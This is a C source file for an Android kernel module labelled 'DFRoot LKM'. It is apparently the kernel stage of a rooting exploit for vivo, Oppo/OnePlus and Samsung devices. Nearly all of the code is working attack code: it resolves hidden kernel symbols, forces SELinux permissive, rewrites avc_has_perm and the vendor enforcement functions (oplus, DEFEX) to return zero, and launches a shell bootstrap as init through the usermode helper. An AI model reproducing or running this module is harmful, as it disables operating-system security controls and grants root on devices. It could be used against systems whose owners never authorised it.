#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/namei.h>
#include <linux/ptrace.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <asm/cpufeature.h>
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("DFRoot LKM");

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
typedef unsigned long (*module_kallsyms_lookup_name_t)(const char *name);
typedef void *(*umh_setup_t)(const char *path, char **argv, char **envp, gfp_t gfp,
                             void *init, void *cleanup, void *data);
typedef int (*umh_exec_t)(void *info, int wait);
typedef int  (*kern_path_t)(const char *, unsigned int, struct path *);
typedef int  (*invalidate_t)(struct address_space *);
typedef void (*path_put_t)(const struct path *);
typedef int  (*insn_patch_t)(void *addrs[], u32 insns[], int cnt);

/* vivo iQOO 15 (PD2505D, 6.12.23-android16-5): the vr.ko vendor module
 * registers a global sys_exit tracepoint callback whose handler crashes the
 * system once KernelSU registers its own hooks and the manager is opened.
 * GhostLock's device-verified profile establishes that the tracepoint's
 * funcs array pointer lives at __tracepoint_sys_exit + 72 on this kernel.
 * Zeroing it before the KSU handoff prevents the crash. */
#define VIVO_SYS_EXIT_FUNCS_OFF  72

static insn_patch_t insn_patch_text;

/* Reversible function patch: saves the original 3 instructions so the patch
 * can be undone after the root handoff completes. A single saved entry is
 * enough — only the avc pair (enforcing-arming pair) is ever reverted; the
 * Samsung/Oppo patches stay until reboot by design. */
struct rev_patch {
    void *fn;
    u32   orig[3];
    bool  active;
};

static __nocfi void patch_fn_ret_zero(struct rev_patch *rp, void *fn)
{
    void *addrs[3];
    u32 insns[3];

    addrs[0] = fn;
    addrs[1] = (u8 *)fn + 4;
    addrs[2] = (u8 *)fn + 8;

    insns[0] = 0xD503245F;  // BTI C  (valid landing pad, NOP when BTI not enforced)
    insns[1] = 0xD2800000;  // MOV x0, #0
    insns[2] = 0xD65F03C0;  // RET

    /* Capture originals before overwriting. aarch64_insn_patch_text gives
     * us no read-back, so fetch directly — the entry text is mapped
     * read-only but readable via the direct map alias. */
    rp->fn = fn;
    rp->orig[0] = *(volatile u32 *)fn;
    rp->orig[1] = *(volatile u32 *)((u8 *)fn + 4);
    rp->orig[2] = *(volatile u32 *)((u8 *)fn + 8);
    rp->active = true;

    if (insn_patch_text(addrs, insns, 3))
        pr_warn("dfroot: patch failed at %px\n", fn);
}

static __nocfi void unpatch_fn(struct rev_patch *rp)
{
    void *addrs[3];
    int i;

    if (!rp->active || !rp->fn)
        return;
    for (i = 0; i < 3; i++)
        addrs[i] = (u8 *)rp->fn + 4 * i;
    if (insn_patch_text(addrs, rp->orig, 3))
        pr_warn("dfroot: unpatch failed at %px\n", rp->fn);
    rp->active = false;
}

/* Module kallsyms lookup convenience: returns 0 when the symbol is absent. */
static unsigned long mod_sym(module_kallsyms_lookup_name_t mkln,
                             const char *mod, const char *sym)
{
    char qualified[64];
    if (!mkln)
        return 0;
    snprintf(qualified, sizeof(qualified), "%s:%s", mod, sym);
    return mkln(qualified);
}

/* KernelSU detection: any kernelsu-module symbol visible via module kallsyms
 * means a KSU variant is already resident. Re-running the exploit on top of a
 * loaded KSU corrupts its state (double registration, torn hooks). */
static bool ksu_loaded(module_kallsyms_lookup_name_t mkln)
{
    if (mod_sym(mkln, "kernelsu", "ksu_handle_execveat_ksud"))
        return true;
    if (mod_sym(mkln, "kernelsu", "ksu_handle_execve_sucompat_common"))
        return true;
    /* KSU-Next / other forks register the same exported entry point name. */
    if (mod_sym(mkln, "kernelsu", "ksu_handle_execveat"))
        return true;
    return false;
}

/* vivo vr.ko guard: zero the funcs array pointer of the global sys_exit
 * tracepoint so the vendor callback stops firing after the KSU handoff.
 * Gated on /sys/module/vr existing — non-vivo devices never touch the
 * shared tracepoint. The funcs pointer must be non-NULL; otherwise the
 * callback is already disarmed. The +72 offset is device-verified by
 * GhostLock's iQOO 15 profile; a NULL funcs here is a no-op, and the
 * write itself is a single aligned store. */
static int vivo_disarm_sys_exit(kallsyms_lookup_name_t get_addr,
                                kern_path_t kern_path_fn,
                                path_put_t path_put_fn)
{
    struct path p;
#if LINUX_VERSION_CODE == KERNEL_VERSION(6, 12, 0)
    void *tp, **funcs;
    unsigned long vaddr;
#endif

    if (kern_path_fn("/sys/module/vr", 0, &p)) {
        pr_info("dfroot: vr module not loaded, skipping sys_exit guard\n");
        return 0;
    }
    path_put_fn(&p);

    /* Guard the layout assumption: the +72 offset is only known for the
     * vivo android16-6.12 kernel (6.12.23-android16-5). On any other KMI
     * build the struct tracepoint layout may differ, so skip the guard
     * instead of writing at a wrong offset. */
#if LINUX_VERSION_CODE != KERNEL_VERSION(6, 12, 0)
    pr_info("dfroot: sys_exit guard not verified for this KMI, skipping\n");
    return 0;
#else
    tp = (void *)get_addr("__tracepoint_sys_exit");
    if (!tp) {
        pr_err("dfroot: __tracepoint_sys_exit not found\n");
        return -EINVAL;
    }

    funcs = (void **)((u8 *)tp + VIVO_SYS_EXIT_FUNCS_OFF);
    if (!READ_ONCE(*funcs)) {
        pr_info("dfroot: sys_exit funcs already empty\n");
        return 0;
    }

    vaddr = (unsigned long)xchg(funcs, NULL);
    pr_info("dfroot: vivo sys_exit funcs %px cleared\n", (void *)vaddr);
    return 0;
#endif
}

static int __nocfi __init dfroot_init(void)
{
    kallsyms_lookup_name_t get_addr;
    kern_path_t  kern_path_fn;
    invalidate_t invalidate_fn;
    path_put_t   path_put_fn;
    struct path  p;
    umh_setup_t umh_setup;
    umh_exec_t  umh_exec;
    bool *selinux_state;
    module_kallsyms_lookup_name_t mkln;
    struct kprobe kln_kp;
    void *avc_fn, *avc_noaudit_fn, *oplus_exe_fn, *oplus_root_fn, *defex_enforce_fn, *defex_umh_fn;
    void *info;
    int ret;
    /* Patch bookkeeping for the avc pair, which is reverted after the root
     * handoff so SELinux can be re-armed. */
    static struct rev_patch avc_rp, avc_noaudit_rp;
    static struct rev_patch oplus_exe_rp, oplus_root_rp;
    static struct rev_patch defex_enforce_rp, defex_umh_rp;

    // UMH command to run
    static const char sh[] = "/system/bin/sh";
    static const char bootstrap[] = "/data/user_de/0/df.root/bootstrap";
    static char cmd[512];
    static char *envp[] = { "PATH=/system/bin", NULL };
    static char *argv[] = { (char *)sh, "-c", cmd, NULL };
    snprintf(cmd, sizeof(cmd), "touch /dev/dfm0; echo -n 'u:r:init:s0' > /proc/self/attr/exec; exec %s", bootstrap);

    // Symbol finder
    kln_kp = (struct kprobe){ .symbol_name = "kallsyms_lookup_name" };
    if (register_kprobe(&kln_kp) < 0) {
        pr_err("dfroot: kallsyms_lookup_name not found\n");
        return -EINVAL;
    }
    get_addr = (kallsyms_lookup_name_t)kln_kp.addr;
    unregister_kprobe(&kln_kp);

    insn_patch_text = (insn_patch_t)get_addr("aarch64_insn_patch_text");
    if (!insn_patch_text) {
        pr_err("dfroot: aarch64_insn_patch_text not found\n");
        return -EINVAL;
    }

    mkln = (module_kallsyms_lookup_name_t)get_addr("module_kallsyms_lookup_name");

    // Refuse to re-run with KernelSU already resident: the second exploit
    // pass corrupts KSU's registration state and hard-crashes the device.
    if (ksu_loaded(mkln)) {
        pr_err("dfroot: KernelSU already loaded, refusing re-run\n");
        return -EEXIST;
    }

    // Invalidate page_cache for crash_dump64
    // NOTE: this can cause issues if a process is currently executing
    //   crash_dump64. We may want to revert to manual restore patching
    kern_path_fn  = (kern_path_t) get_addr("kern_path");
    invalidate_fn = (invalidate_t)get_addr("invalidate_inode_pages2");
    path_put_fn   = (path_put_t)  get_addr("path_put");
    if (!kern_path_fn || !invalidate_fn || !path_put_fn) {
        pr_err("dfroot: cache drop symbols missing\n");
    } else if (kern_path_fn("/apex/com.android.runtime/bin/crash_dump64",
                            LOOKUP_FOLLOW, &p)) {
        pr_err("dfroot: kern_path failed for crash_dump64\n");
    } else {
        invalidate_fn(p.dentry->d_inode->i_mapping);
        path_put_fn(&p);
        pr_info("dfroot: cleared page cache for crash_dump64\n");
    }

    // vivo: disarm the vr.ko sys_exit tracepoint callback before anything
    // registers new hooks. Must run before the KSU handoff (UMH below) and
    // before SELinux is relaxed, so a failure here aborts cleanly.
    if (vivo_disarm_sys_exit(get_addr, kern_path_fn, path_put_fn)) {
        pr_err("dfroot: vivo sys_exit guard failed; refusing root handoff\n");
        return -EINVAL;
    }

    // Disable SELinux
    selinux_state = (bool *)get_addr("selinux_state");
    if (!selinux_state) {
        pr_err("dfroot: selinux_state not found\n");
        return -EINVAL;
    }
    WRITE_ONCE(*selinux_state, false);
    pr_info("dfroot: selinux_state permissive\n");
    avc_fn = (void *)get_addr("avc_has_perm");
    if (!avc_fn)
        pr_err("dfroot: avc_has_perm not found, skipping\n");
    else {
        patch_fn_ret_zero(&avc_rp, avc_fn);
        pr_info("dfroot: avc_has_perm patched\n");
    }

    avc_noaudit_fn = (void *)get_addr("avc_has_perm_noaudit");
    if (!avc_noaudit_fn)
        pr_err("dfroot: avc_has_perm_noaudit not found, skipping\n");
    else {
        patch_fn_ret_zero(&avc_noaudit_rp, avc_noaudit_fn);
        pr_info("dfroot: avc_has_perm_noaudit patched\n");
    }

    // Oppo/OnePlus
    oplus_exe_fn = (void *)(mkln ? mkln("oplus_exe_block_ret_handler") : 0);
    if (!oplus_exe_fn)
        pr_err("dfroot: oplus_exe_block_ret_handler not found, skipping\n");
    else {
        patch_fn_ret_zero(&oplus_exe_rp, oplus_exe_fn);
        pr_info("dfroot: oplus_exe_block_ret_handler patched\n");
    }

    oplus_root_fn = (void *)(mkln ? mkln("oplus_root_check_post_handler") : 0);
    if (!oplus_root_fn)
        pr_err("dfroot: oplus_root_check_post_handler not found, skipping\n");
    else {
        patch_fn_ret_zero(&oplus_root_rp, oplus_root_fn);
        pr_info("dfroot: oplus_root_check_post_handler patched\n");
    }

    // Samsung
    defex_enforce_fn = (void *)get_addr("task_defex_enforce");
    if (!defex_enforce_fn)
        pr_err("dfroot: task_defex_enforce not found, skipping\n");
    else {
        patch_fn_ret_zero(&defex_enforce_rp, defex_enforce_fn);
        pr_info("dfroot: task_defex_enforce patched\n");
    }

    defex_umh_fn = (void *)get_addr("task_defex_user_exec");
    if (!defex_umh_fn)
        pr_err("dfroot: task_defex_user_exec not found, skipping\n");
    else {
        patch_fn_ret_zero(&defex_umh_rp, defex_umh_fn);
        pr_info("dfroot: task_defex_user_exec patched\n");
    }

    // Run UMH command
    umh_setup = (umh_setup_t)get_addr("call_usermodehelper_setup");
    umh_exec  = (umh_exec_t)get_addr("call_usermodehelper_exec");
    if (!umh_setup || !umh_exec) {
        pr_err("dfroot: usermodehelper symbols missing (setup=%px exec=%px)\n",
               umh_setup, umh_exec);
        return -EINVAL;
    }

    info = umh_setup(sh, argv, envp, GFP_KERNEL, NULL, NULL, NULL);
    if (!info) {
        pr_err("dfroot: usermodehelper_setup: returned NULL\n");
        return -EINVAL;
    }
    // bypass CONFIG_STATIC_USERMODEHELPER_PATH="" overriding path to ""
    ((struct subprocess_info *)info)->path = sh;

    /* UMH_WAIT_PROC: wait for the bootstrap (exec'd by sh -c) to fully exit
     * so the SELinux teardown below happens strictly after ksud late-load
     * and the soft-reboot trigger have finished. */
    ret = umh_exec(info, UMH_WAIT_PROC);
    pr_info("dfroot: usermodehelper_exec returned %d\n", ret);

    /* Re-arm SELinux: restore the avc patches first (they would otherwise
     * hollow out enforcing), then flip selinux_state back on. After this
     * the kernel is enforcing again, same policy as before the exploit.
     * KernelSU's own hooks were granted access during the permissive
     * window via the policy loaded by ksud, so they keep working. */
    unpatch_fn(&avc_rp);
    unpatch_fn(&avc_noaudit_rp);
    WRITE_ONCE(*selinux_state, true);
    pr_info("dfroot: selinux_state enforcing restored\n");

    return -ENODEV; /* return any error to unload module */
}

/* no module_exit: we never unload; saves .exit sections */
module_init(dfroot_init);
